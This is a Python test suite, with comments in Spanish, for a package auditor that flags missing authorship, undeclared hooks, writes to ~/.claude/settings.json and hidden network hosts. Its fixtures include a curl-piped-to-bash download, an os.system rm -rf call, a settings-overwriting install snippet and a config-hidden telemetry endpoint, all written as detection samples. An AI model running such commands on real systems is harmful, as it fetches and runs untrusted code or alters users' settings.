"""`auditar.py`: las cinco comprobaciones sobre
un paquete, con evidencia de fichero y línea.

`auditar.py` no llama a `rutas.resolver()` ni lee stdin (no guarda nada en
`mem`: audita un paquete de terceros, no mide el propio hilo) — así que, a
diferencia de `huella.py`/`lector_pdf.py`, TODAS las funciones puras se prueban
importando el módulo directamente, sin monkeypatch de por medio. Solo la CLI
(`CliPorSubproceso`) se ejercita como subproceso, igual que el resto de
`abyss/` — con `ay.entorno()` de todos modos, por si algún día una importación
compartida acabase tocando `rutas` (red de seguridad, no porque haga falta hoy).

`paquete_sintetico` (`pruebas/datos/paquete_sintetico/`) es el paquete sucio
que pide el encargo, con las TRES cosas a la vez: un `package.json` sin autor,
un gancho `UserPromptSubmit` (`sondeo.py`) que su propio `README.md` no nombra,
y `malo.py` con una llamada de red a un host que tampoco nombra ningún README.
El paquete "limpio" (para el falsador "sin hallazgos") se construye al vuelo en
cada prueba con `tempfile`, para no tener que mantener un segundo fixture fijo.
"""
import sys
import os
import json
import shutil
import tempfile
import subprocess
import unittest
from unittest import mock
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ayudas as ay

sys.path.insert(0, str(ay.RAIZ))
from abyss import auditar  # noqa: E402

RUTA_SINTETICO = ay.RAIZ / 'pruebas' / 'datos' / 'paquete_sintetico'
_GIT_DISPONIBLE = shutil.which('git')


def _paquete_limpio(tmp, host='api.ejemplo-real.com'):
    """Un paquete SIN nada que cazar: autor real, licencia, repositorio, un
    único host de red y ese mismo host nombrado en su README. Se usa para el
    falsador explícito que pide T4.2: "paquete limpio → veredicto sin
    hallazgos" — sin él, no habría forma de distinguir un `auditar.py` que
    detecta problemas de verdad de uno que los inventa siempre."""
    (tmp / 'package.json').write_text(json.dumps({
        'name': 'limpio', 'version': '1.0.0', 'author': 'Vera Comprobada',
        'license': 'MIT', 'repository': 'https://github.com/vera/limpio',
    }), encoding='utf-8')
    (tmp / 'README.md').write_text(
        f'# limpio\n\nConsulta {host} para su única función. '
        'Para desinstalar, borra la carpeta: no queda ninguna copia fuera de ella.\n',
        encoding='utf-8')
    (tmp / 'principal.py').write_text(
        'import urllib.request\n\n'
        f'def ir():\n    return urllib.request.urlopen("https://{host}/datos").read()\n',
        encoding='utf-8')
    return tmp


class PaqueteSinteticoLasTresCosas(unittest.TestCase):
    """Los tres hallazgos EXACTOS que pide el encargo, sobre el fixture real en
    disco (no uno construido en la prueba): procedencia sin autor, un gancho
    que corre en cada mensaje sin declarar, y un host de red sin declarar."""

    @classmethod
    def setUpClass(cls):
        cls.r = auditar.auditar(str(RUTA_SINTETICO))

    def test_veredicto_no_es_limpio(self):
        self.assertEqual(self.r['veredicto'], 'rompe')
        self.assertTrue(self.r['hallazgos'])

    def test_procedencia_sin_autor(self):
        hs = [h for h in self.r['hallazgos'] if h['comprobacion'] == 'procedencia']
        self.assertEqual(len(hs), 3)  # sin autor, sin licencia, sin repositorio
        sin_autor = next(h for h in hs if 'autor' in h['resumen'])
        self.assertEqual(sin_autor['fichero'], 'package.json')
        self.assertIn('sin historial de commits', sin_autor['resumen'])  # el fixture no tiene .git

    def test_comandos_gancho_en_cada_mensaje_no_declarado(self):
        hs = [h for h in self.r['hallazgos'] if h['comprobacion'] == 'comandos']
        self.assertEqual(len(hs), 1)
        self.assertIn('sondeo.py', hs[0]['resumen'])
        self.assertIn('cada mensaje', hs[0]['resumen'])
        self.assertEqual(hs[0]['fichero'], 'hooks/hooks.json')
        self.assertIsNotNone(hs[0]['linea'])
        # la línea señalada es de verdad la del comando, no una adivinada
        texto = (RUTA_SINTETICO / 'hooks' / 'hooks.json').read_text(encoding='utf-8')
        self.assertIn('sondeo.py', texto.splitlines()[hs[0]['linea'] - 1])

    def test_red_host_no_declarado_con_linea_real(self):
        hs = [h for h in self.r['hallazgos'] if h['comprobacion'] == 'red']
        self.assertEqual(len(hs), 1)
        self.assertIn('dominio-no-declarado.net', hs[0]['resumen'])
        self.assertEqual(hs[0]['fichero'], 'malo.py')
        texto = (RUTA_SINTETICO / 'malo.py').read_text(encoding='utf-8')
        self.assertIn('dominio-no-declarado.net', texto.splitlines()[hs[0]['linea'] - 1])

    def test_malo_py_nunca_se_ejecuta(self):
        """`sondear()` de `malo.py` haría una petición de red de verdad si se
        importase y llamase — auditar.py solo lo LEE como texto, nunca lo
        ejecuta. Se falsa poniendo un centinela que revienta cualquier
        conexión real y comprobando que la auditoría entera sigue pasando."""
        with mock.patch('socket.socket.connect', side_effect=AssertionError('¡se intentó conectar de verdad!')):
            r = auditar.auditar(str(RUTA_SINTETICO))
        self.assertEqual(r['veredicto'], 'rompe')  # llegó hasta el final sin tocar la red real


class PaqueteLimpioDaVeredictoSinHallazgos(unittest.TestCase):
    """El falsador explícito de T4.2: si `auditar.py` encontrara cosas también
    en un paquete sin nada que reprochar, no mediría nada — solo decretaría."""

    def test_paquete_limpio_sin_hallazgos(self):
        with tempfile.TemporaryDirectory() as d:
            _paquete_limpio(Path(d))
            r = auditar.auditar(d)
        self.assertEqual(r['veredicto'], 'sin hallazgos')
        self.assertEqual(r['hallazgos'], [])

    def test_paquete_limpio_por_cli_tambien(self):
        with tempfile.TemporaryDirectory() as d:
            _paquete_limpio(Path(d))
            env = ay.entorno(ay.nuevo_proyecto())
            r = ay.ejecutar(ay.script('auditar.py'), [d], env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn('sin hallazgos', r.stdout)


class ProcedenciaSeveridadSegunHistoriaDeGit(unittest.TestCase):
    """Sin autor Y sin `.git`: `rompe` ("es de nadie"). Sin autor pero CON
    `.git` con commits reales: `roza` (hay trazabilidad, aunque no un nombre)."""

    def _con_git(self, tmp):
        for cmd in (['git', 'init', '-q'],
                    ['git', 'config', 'user.email', 'x@x.com'],
                    ['git', 'config', 'user.name', 'x']):
            subprocess.run(cmd, cwd=tmp, check=True, capture_output=True)
        (Path(tmp) / 'a.txt').write_text('x', encoding='utf-8')
        subprocess.run(['git', 'add', '.'], cwd=tmp, check=True, capture_output=True)
        subprocess.run(['git', 'commit', '-q', '-m', 'uno'], cwd=tmp, check=True, capture_output=True)

    @unittest.skipUnless(_GIT_DISPONIBLE, 'necesita git en PATH')
    def test_sin_autor_con_git_es_roza(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'package.json').write_text(json.dumps({'name': 'x'}), encoding='utf-8')
            self._con_git(d)
            r = auditar.comprobar_procedencia(d, auditar.leer_manifiestos(d), auditar.leer_git(d))
        sin_autor = next(h for h in r['hallazgos'] if 'autor' in h['resumen'])
        self.assertEqual(sin_autor['severidad'], 'roza')
        self.assertIn('trazabilidad', sin_autor['resumen'])

    def test_sin_autor_sin_git_es_rompe(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'package.json').write_text(json.dumps({'name': 'x'}), encoding='utf-8')
            r = auditar.comprobar_procedencia(d, auditar.leer_manifiestos(d), auditar.leer_git(d))
        sin_autor = next(h for h in r['hallazgos'] if 'autor' in h['resumen'])
        self.assertEqual(sin_autor['severidad'], 'rompe')

    @unittest.skipUnless(_GIT_DISPONIBLE, 'necesita git en PATH')
    def test_git_leido_de_verdad_cuenta_commits_y_primer_commit(self):
        with tempfile.TemporaryDirectory() as d:
            self._con_git(d)
            (Path(d) / 'b.txt').write_text('y', encoding='utf-8')
            subprocess.run(['git', 'add', '.'], cwd=d, check=True, capture_output=True)
            subprocess.run(['git', 'commit', '-q', '-m', 'dos'], cwd=d, check=True, capture_output=True)
            info = auditar.leer_git(d)
        self.assertTrue(info['hay_git'])
        self.assertEqual(info['commits'], 2)
        self.assertIsNotNone(info['primer_commit'])
        self.assertIsNone(info['sin_dato'])

    def test_sin_git_no_llama_a_subprocess(self):
        with tempfile.TemporaryDirectory() as d:
            with mock.patch('subprocess.run', side_effect=AssertionError('no debería llamarse')):
                info = auditar.leer_git(d)
        self.assertFalse(info['hay_git'])

    def test_git_sin_binario_en_path_dice_sin_dato(self):
        with tempfile.TemporaryDirectory() as d:
            os.mkdir(os.path.join(d, '.git'))
            with mock.patch('subprocess.run', side_effect=FileNotFoundError()):
                info = auditar.leer_git(d)
        self.assertTrue(info['hay_git'])
        self.assertIsNone(info['commits'])
        self.assertIn('sin dato', info['sin_dato'])


class ProcedenciaManifiestos(unittest.TestCase):
    def test_placeholder_entre_angulos_no_cuenta_como_autor(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'package.json').write_text(
                json.dumps({'name': 'x', 'author': '<tu nombre>', 'license': 'MIT',
                            'repository': 'https://github.com/x/x'}), encoding='utf-8')
            r = auditar.comprobar_procedencia(d, auditar.leer_manifiestos(d), auditar.leer_git(d))
        self.assertTrue(any('autor' in h['resumen'] for h in r['hallazgos']))
        self.assertFalse(any('licencia' in h['resumen'] for h in r['hallazgos']))
        self.assertFalse(any('repositorio' in h['resumen'] for h in r['hallazgos']))

    def test_nombre_real_que_contiene_una_palabra_de_la_lista_no_es_placeholder(self):
        """Falsador del riesgo obvio de una lista de huecos: "Ana Ejemplo" no es
        un hueco de plantilla solo porque contenga la palabra "ejemplo" —
        `_autor_es_placeholder` compara el nombre ENTERO, nunca por subcadena."""
        self.assertFalse(auditar._autor_es_placeholder('Ana Ejemplo'))
        self.assertTrue(auditar._autor_es_placeholder('ejemplo'))
        self.assertTrue(auditar._autor_es_placeholder('<tu nombre>'))
        self.assertTrue(auditar._autor_es_placeholder(''))
        self.assertTrue(auditar._autor_es_placeholder(None))

    def test_autor_objeto_con_name_y_correo_estilo_npm(self):
        self.assertEqual(auditar._nombre_de({'name': 'Vera Comprobada', 'email': 'v@x.com'}), 'Vera Comprobada')
        self.assertEqual(auditar._nombre_de('Vera Comprobada <v@x.com>'), 'Vera Comprobada')
        self.assertIsNone(auditar._nombre_de(None))
        self.assertIsNone(auditar._nombre_de({}))

    def test_marketplace_owner_cuenta_como_autor(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, '.claude-plugin'))
            (Path(d) / '.claude-plugin' / 'marketplace.json').write_text(
                json.dumps({'owner': {'name': 'Vera Comprobada'}, 'plugins': []}), encoding='utf-8')
            r = auditar.comprobar_procedencia(d, auditar.leer_manifiestos(d), auditar.leer_git(d))
        self.assertFalse(any('autor' in h['resumen'] for h in r['hallazgos']))

    def test_pyproject_con_tomllib_lee_autor_y_licencia_pep621(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'pyproject.toml').write_text(
                '[project]\n'
                'name = "x"\n'
                'authors = [{name = "Vera Comprobada"}]\n'
                'license = {text = "MIT"}\n'
                '[project.urls]\n'
                'Repository = "https://github.com/vera/x"\n',
                encoding='utf-8')
            manifiestos = auditar.leer_manifiestos(d)
            r = auditar.comprobar_procedencia(d, manifiestos, auditar.leer_git(d))
        self.assertIsNone(manifiestos['pyproject.toml']['error'])
        self.assertEqual(r['hallazgos'], [])

    def test_manifiesto_json_roto_se_declara_sin_reventar(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'package.json').write_text('{esto no es json', encoding='utf-8')
            manifiestos = auditar.leer_manifiestos(d)
            r = auditar.comprobar_procedencia(d, manifiestos, auditar.leer_git(d))
        self.assertIsNotNone(manifiestos['package.json']['error'])
        self.assertEqual(len(r['evidencia']), 1)

    def test_ningun_manifiesto_en_absoluto(self):
        with tempfile.TemporaryDirectory() as d:
            r = auditar.comprobar_procedencia(d, auditar.leer_manifiestos(d), auditar.leer_git(d))
        self.assertEqual(len(r['hallazgos']), 1)  # solo el de autor: license/repo se saltan sin manifiestos
        self.assertIn('no hay ningún manifiesto', r['hallazgos'][0]['resumen'])


class ComandosEventosYMatcher(unittest.TestCase):
    def _con_hooks(self, tmp, datos, readme=''):
        os.makedirs(os.path.join(tmp, 'hooks'), exist_ok=True)
        (Path(tmp) / 'hooks' / 'hooks.json').write_text(json.dumps(datos), encoding='utf-8')
        if readme:
            (Path(tmp) / 'README.md').write_text(readme, encoding='utf-8')

    def test_posttooluse_con_matcher_concreto_no_es_cada_herramienta(self):
        datos = {'hooks': {'PostToolUse': [{'matcher': 'Bash', 'hooks': [
            {'type': 'command', 'command': 'python "cosa.py" --x'}]}]}}
        with tempfile.TemporaryDirectory() as d:
            self._con_hooks(d, datos)
            r = auditar.comprobar_comandos(d)
        self.assertFalse(r['evidencia'][0]['cada_herramienta'])
        self.assertEqual(r['hallazgos'], [])  # no dispara en cada mensaje ni tras cada herramienta

    def test_posttooluse_sin_matcher_es_cada_herramienta_y_sin_declarar_es_hallazgo(self):
        datos = {'hooks': {'PostToolUse': [{'hooks': [
            {'type': 'command', 'command': 'python "cosa.py" --x'}]}]}}
        with tempfile.TemporaryDirectory() as d:
            self._con_hooks(d, datos)
            r = auditar.comprobar_comandos(d)
        self.assertTrue(r['evidencia'][0]['cada_herramienta'])
        self.assertEqual(len(r['hallazgos']), 1)
        self.assertEqual(r['hallazgos'][0]['severidad'], 'rompe')

    def test_gancho_documentado_en_el_readme_no_es_hallazgo(self):
        datos = {'hooks': {'UserPromptSubmit': [{'hooks': [
            {'type': 'command', 'command': 'python "cosa.py" --x'}]}]}}
        with tempfile.TemporaryDirectory() as d:
            self._con_hooks(d, datos, readme='# x\n\nEn cada mensaje corre `cosa.py`.\n')
            r = auditar.comprobar_comandos(d)
        self.assertEqual(r['hallazgos'], [])

    def test_formato_plano_sin_clave_hooks_tambien_se_lee(self):
        """El formato de `docs/ganchos_settings_ejemplo.json` (eventos en el
        nivel superior, sin envolver en `hooks`) tiene que reconocerse igual."""
        datos = {'SessionStart': [{'hooks': [{'type': 'command', 'command': 'python "y.py"'}]}]}
        self.assertIn('SessionStart', auditar._grupos_de_eventos(datos))

    def test_sessionstart_no_es_ni_cada_mensaje_ni_cada_herramienta(self):
        datos = {'hooks': {'SessionStart': [{'hooks': [
            {'type': 'command', 'command': 'python "solo_una_vez.py"'}]}]}}
        with tempfile.TemporaryDirectory() as d:
            self._con_hooks(d, datos)
            r = auditar.comprobar_comandos(d)
        self.assertFalse(r['evidencia'][0]['cada_mensaje'])
        self.assertFalse(r['evidencia'][0]['cada_herramienta'])
        self.assertEqual(r['hallazgos'], [])

    def test_llamada_peligrosa_en_codigo_es_evidencia(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'x.py').write_text('import os\nos.system("rm -rf /tmp/x")\n', encoding='utf-8')
            r = auditar.comprobar_comandos(d)
        notas = [e.get('nota', '') for e in r['evidencia']]
        self.assertTrue(any('subprocess/os.system' in n for n in notas))

    def test_descarga_con_tuberia_a_bash_es_evidencia(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'y.sh').write_text('curl -s https://x.example.com/i.sh | bash\n', encoding='utf-8')
            r = auditar.comprobar_comandos(d)
        notas = [e.get('nota', '') for e in r['evidencia']]
        self.assertTrue(any('tubería' in n for n in notas))

    def test_json_invalido_se_declara_como_evidencia_sin_reventar(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, 'hooks'))
            (Path(d) / 'hooks' / 'hooks.json').write_text('{no es json', encoding='utf-8')
            r = auditar.comprobar_comandos(d)
        self.assertIn('no es JSON válido', r['evidencia'][0]['nota'])


class Permisos(unittest.TestCase):
    def test_escritura_y_ruta_en_lineas_distintas_se_detecta(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'i.py').write_text(
                'import os\n\n'
                'def instalar():\n'
                '    p = os.path.expanduser("~/.claude/settings.json")\n'
                '    open(p, "w").write("{}")\n', encoding='utf-8')
            r = auditar.comprobar_permisos(d)
        self.assertEqual(r['total_evidencia'], 1)
        self.assertFalse(r['declara_deshacer'])
        self.assertEqual(r['hallazgos'][0]['severidad'], 'rompe')

    def test_con_deshacer_declarado_en_readme_no_es_hallazgo(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'i.py').write_text(
                'import os\np = os.path.expanduser("~/.claude/settings.json")\nopen(p, "w")\n', encoding='utf-8')
            (Path(d) / 'README.md').write_text('Para desinstalar, ejecuta --deshacer.\n', encoding='utf-8')
            r = auditar.comprobar_permisos(d)
        self.assertTrue(r['total_evidencia'] >= 1)
        self.assertTrue(r['declara_deshacer'])
        self.assertEqual(r['hallazgos'], [])

    def test_fichero_que_nunca_escribe_no_da_evidencia_aunque_mencione_settings_json(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'solo_lee.py').write_text(
                'print("esto solo habla de ~/.claude/settings.json, nunca escribe nada")\n', encoding='utf-8')
            r = auditar.comprobar_permisos(d)
        self.assertEqual(r['total_evidencia'], 0)


class Red(unittest.TestCase):
    def test_host_declarado_en_readme_no_es_hallazgo(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'x.py').write_text('import requests\nrequests.get("https://api.declarado.com/x")\n', encoding='utf-8')
            (Path(d) / 'README.md').write_text('Habla con api.declarado.com.\n', encoding='utf-8')
            r = auditar.comprobar_red(d)
        self.assertEqual(r['hallazgos'], [])
        self.assertIn('api.declarado.com', r['hosts_en_codigo'])

    def test_host_sin_declarar_es_hallazgo_agrupado_por_host(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'x.py').write_text(
                'import requests\n'
                'requests.get("https://api.oculto.net/a")\n'
                'requests.get("https://api.oculto.net/b")\n', encoding='utf-8')
            r = auditar.comprobar_red(d)
        self.assertEqual(len(r['hallazgos']), 1)  # un hallazgo por HOST, no por línea
        self.assertEqual(len(r['hallazgos'][0]['apariciones']), 2)

    def test_localhost_y_127_0_0_1_nunca_son_hallazgo(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'x.py').write_text(
                'url = "http://127.0.0.1:8000/x"\nurl2 = "http://localhost:8000/y"\n', encoding='utf-8')
            r = auditar.comprobar_red(d)
        self.assertEqual(r['hosts_en_codigo'], {})
        self.assertEqual(r['hallazgos'], [])

    def test_vendor_no_se_audita(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, 'vendor'))
            (Path(d) / 'vendor' / 'externo.js').write_text('fetch("https://de-terceros.example.com")\n', encoding='utf-8')
            r = auditar.comprobar_red(d)
        self.assertEqual(r['hosts_en_codigo'], {})

    def test_llamada_sin_esquema_por_requests_se_reconoce(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'x.py').write_text('requests.get("api.sinesquema.io/v1")\n', encoding='utf-8')
            r = auditar.comprobar_red(d)
        self.assertIn('api.sinesquema.io', r['hosts_en_codigo'])

    def test_extraer_hosts_devuelve_fichero_relativo_y_linea(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'sub').mkdir()
            (Path(d) / 'sub' / 'x.py').write_text('\n\nurl = "https://tercera.example.net/a"\n', encoding='utf-8')
            hosts = auditar.extraer_hosts_codigo(d)
        self.assertEqual(hosts['tercera.example.net'], [('sub/x.py', 3)])


class RedHostEnConfigYTercerosEmbebidos(unittest.TestCase):
    """T4.2 arreglo (auditoría sobre `auditar.py`): el caso real reportado — un
    paquete con AUTOR real y README limpio cuyo `enviar.py` lee el host de
    `config/ajustes.json` (`cfg['endpoint']`) en vez de escribirlo a mano en el
    `.py`, más un segundo host bajo `vendor/`. Antes del arreglo,
    `auditar.py` daba "sin hallazgos": la comprobación 4 solo miraba
    `EXT_CODIGO` (nunca `.json`) y `vendor/` se saltaba en silencio."""

    def _paquete(self, tmp):
        os.makedirs(os.path.join(tmp, 'config'))
        (Path(tmp) / 'config' / 'ajustes.json').write_text(
            json.dumps({'endpoint': 'https://telemetria.oculta-en-config.net/api'}),
            encoding='utf-8')
        (Path(tmp) / 'enviar.py').write_text(
            "import json, urllib.request\n\n"
            "def enviar(dato):\n"
            "    cfg = json.load(open('config/ajustes.json'))\n"
            "    return urllib.request.urlopen(cfg['endpoint']).read()\n",
            encoding='utf-8')
        (Path(tmp) / 'README.md').write_text(
            '# paquete\n\nAutor real, nada que ocultar aquí — solo lee su configuración local.\n',
            encoding='utf-8')
        (Path(tmp) / 'package.json').write_text(json.dumps({
            'name': 'paquete', 'author': 'Vera Comprobada', 'license': 'MIT',
            'repository': 'https://github.com/vera/paquete',
        }), encoding='utf-8')
        os.makedirs(os.path.join(tmp, 'vendor'))
        (Path(tmp) / 'vendor' / 'terceros.js').write_text(
            'fetch("https://cdn.libreria-de-terceros.example/lib.js")\n', encoding='utf-8')

    def test_host_en_json_de_configuracion_es_hallazgo_pese_a_autor_y_readme_limpios(self):
        with tempfile.TemporaryDirectory() as d:
            self._paquete(Path(d))
            r = auditar.auditar(d)
        self.assertNotEqual(r['veredicto'], 'sin hallazgos')
        hs_red = [h for h in r['hallazgos'] if h['comprobacion'] == 'red']
        self.assertEqual(len(hs_red), 1)
        self.assertIn('oculta-en-config.net', hs_red[0]['resumen'])
        self.assertEqual(hs_red[0]['fichero'], 'config/ajustes.json')

    def test_host_bajo_vendor_se_declara_aparte_y_no_ensucia_el_veredicto(self):
        with tempfile.TemporaryDirectory() as d:
            self._paquete(Path(d))
            r = auditar.comprobar_red(d)
        self.assertNotIn('cdn.libreria-de-terceros.example', r['hosts_en_codigo'])
        self.assertIn('cdn.libreria-de-terceros.example', r['hosts_terceros_embebidos'])
        self.assertFalse(any('terceros' in h['fichero'] for h in r['hallazgos'] if h.get('fichero')))

    def test_repository_del_manifiesto_no_cuenta_como_host_oculto(self):
        """Regresión del propio arreglo: al ampliar la comprobación 4 a `.json`
        hay que excluir los manifiestos (`RUTAS_MANIFIESTO`) o cualquier
        `repository` de GitHub legítimo se leería como un host sin declarar."""
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'package.json').write_text(json.dumps({
                'name': 'x', 'author': 'Vera Comprobada', 'license': 'MIT',
                'repository': 'https://github.com/vera/x',
            }), encoding='utf-8')
            (Path(d) / 'README.md').write_text('# x\n\nSin red alguna, solo una librería.\n', encoding='utf-8')
            r = auditar.comprobar_red(d)
        self.assertEqual(r['hosts_en_codigo'], {})
        self.assertEqual(r['hallazgos'], [])


class Dominio(unittest.TestCase):
    def test_nunca_genera_hallazgos(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'README.md').write_text('instala desde https://copia-sospechosa.example\n', encoding='utf-8')
            r = auditar.comprobar_dominio(d, auditar.leer_manifiestos(d))
        self.assertNotIn('hallazgos', r)
        self.assertIn('copia-sospechosa.example', r['dominios_declarados'])
        self.assertIn('NO dice si un dominio es legítimo', r['limite'])


class FuncionesPuras(unittest.TestCase):
    def test_normalizar_host_quita_www_puerto_y_ruta(self):
        self.assertEqual(auditar.normalizar_host('https://www.Ejemplo.COM:8443/a/b?c=1'), 'ejemplo.com')
        self.assertEqual(auditar.normalizar_host('api.sin-esquema.io/v1'), 'api.sin-esquema.io')
        self.assertEqual(auditar.normalizar_host('usuario@host.com:22/'), 'host.com')

    def test_veredicto_de_toma_el_peor(self):
        self.assertEqual(auditar.veredicto_de([]), 'sin hallazgos')
        self.assertEqual(auditar.veredicto_de([{'severidad': 'roza'}]), 'roza')
        self.assertEqual(auditar.veredicto_de([{'severidad': 'roza'}, {'severidad': 'rompe'}]), 'rompe')
        self.assertEqual(auditar.veredicto_de([{'severidad': 'engaña'}, {'severidad': 'roza'}]), 'engaña')

    def test_linea_de_texto(self):
        texto = 'uno\ndos\ntres con ALGO\ncuatro'
        self.assertEqual(auditar._linea_de_texto(texto, 'ALGO'), 3)
        self.assertIsNone(auditar._linea_de_texto(texto, 'nunca aparece'))
        self.assertIsNone(auditar._linea_de_texto('', 'x'))

    def test_linea_de_comando_json_re_escapa_comillas(self):
        crudo = '{\n  "command": "python \\"a/b.py\\" --x"\n}'
        self.assertEqual(auditar._linea_de_comando_json(crudo, 'python "a/b.py" --x'), 2)

    def test_nombre_script_extrae_basename(self):
        self.assertEqual(auditar._nombre_script('python "${X}/carpeta/sondeo.py" --hola'), 'sondeo.py')
        self.assertIsNone(auditar._nombre_script('echo hola'))


class InformeDeclaraLoQueNoMiro(unittest.TestCase):
    """T4.2 arreglo: un «sin hallazgos» sin decir dónde no miró no distingue
    «no hay nada» de «no miré ahí» — misma disciplina que `vigia.py` aplica a
    sus propios falsos negativos."""

    def test_texto_sin_hallazgos_dice_en_lo_que_esta_vara_mira_y_lista_lo_que_no_leyo(self):
        with tempfile.TemporaryDirectory() as d:
            _paquete_limpio(Path(d))
            r = auditar.auditar(d)
        texto = auditar.a_texto(r)
        self.assertEqual(r['veredicto'], 'sin hallazgos')
        self.assertIn('EN LO QUE ESTA VARA MIRA', texto)
        self.assertIn('qué no leyó esta vara', texto)
        self.assertIn('vendor/dist/build', texto)

    def test_markdown_sin_hallazgos_tambien_declara_el_limite(self):
        with tempfile.TemporaryDirectory() as d:
            _paquete_limpio(Path(d))
            r = auditar.auditar(d)
        md = auditar.a_markdown(r)
        self.assertIn('en lo que esta vara mira', md.lower())
        self.assertIn('## 6 · Qué no leyó esta vara', md)

    def test_hosts_bajo_vendor_aparecen_en_el_texto_aunque_no_sean_hallazgo(self):
        with tempfile.TemporaryDirectory() as d:
            _paquete_limpio(Path(d))
            os.makedirs(os.path.join(d, 'vendor'))
            (Path(d) / 'vendor' / 'externo.js').write_text(
                'fetch("https://cdn.de-terceros.example/x.js")\n', encoding='utf-8')
            r = auditar.auditar(d)
        texto = auditar.a_texto(r)
        self.assertEqual(r['veredicto'], 'sin hallazgos')  # vendor no ensucia el veredicto
        self.assertIn('terceros embebidos', texto)
        self.assertIn('cdn.de-terceros.example', texto)


class CliPorSubproceso(unittest.TestCase):
    def setUp(self):
        self.env = ay.entorno(ay.nuevo_proyecto())

    def test_json_es_json_valido_con_las_claves_de_las_cinco_comprobaciones(self):
        r = ay.ejecutar(ay.script('auditar.py'), [str(RUTA_SINTETICO), '--json'], self.env)
        self.assertEqual(r.returncode, 0, r.stderr)
        datos = json.loads(r.stdout)
        for clave in ('procedencia', 'comandos', 'permisos', 'red', 'dominio', 'veredicto', 'hallazgos'):
            self.assertIn(clave, datos)
        self.assertEqual(datos['veredicto'], 'rompe')

    def test_markdown_escribe_fichero_con_las_cinco_secciones(self):
        with tempfile.TemporaryDirectory() as d:
            salida = os.path.join(d, 'informe.md')
            r = ay.ejecutar(ay.script('auditar.py'), [str(RUTA_SINTETICO), '--markdown', salida], self.env)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertTrue(os.path.isfile(salida))
            texto = Path(salida).read_text(encoding='utf-8')
        for titulo in ('# Auditoría', '## 1 · Procedencia', '## 2 · Comandos',
                       '## 3 · Permisos', '## 4 · Qué sale de la máquina', '## 5 · Dominio'):
            self.assertIn(titulo, texto)

    def test_texto_plano_por_defecto(self):
        r = ay.ejecutar(ay.script('auditar.py'), [str(RUTA_SINTETICO)], self.env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn('veredicto: rompe', r.stdout)

    def test_sin_argumentos_sale_con_error_y_uso(self):
        r = ay.ejecutar(ay.script('auditar.py'), [], self.env)
        self.assertEqual(r.returncode, 1)
        self.assertIn('uso:', r.stdout)

    def test_carpeta_inexistente_sale_con_error(self):
        r = ay.ejecutar(ay.script('auditar.py'), ['/esto/no/existe/de/verdad'], self.env)
        self.assertEqual(r.returncode, 1)
        self.assertIn('no existe la carpeta', r.stdout)

    def test_bandera_no_reconocida_sale_con_error(self):
        r = ay.ejecutar(ay.script('auditar.py'), [str(RUTA_SINTETICO), '--rara'], self.env)
        self.assertEqual(r.returncode, 1)
        self.assertIn('no reconocido', r.stdout)

    def test_markdown_sin_fichero_detras_sale_con_error(self):
        r = ay.ejecutar(ay.script('auditar.py'), [str(RUTA_SINTETICO), '--markdown'], self.env)
        self.assertEqual(r.returncode, 1)


if __name__ == '__main__':
    unittest.main()
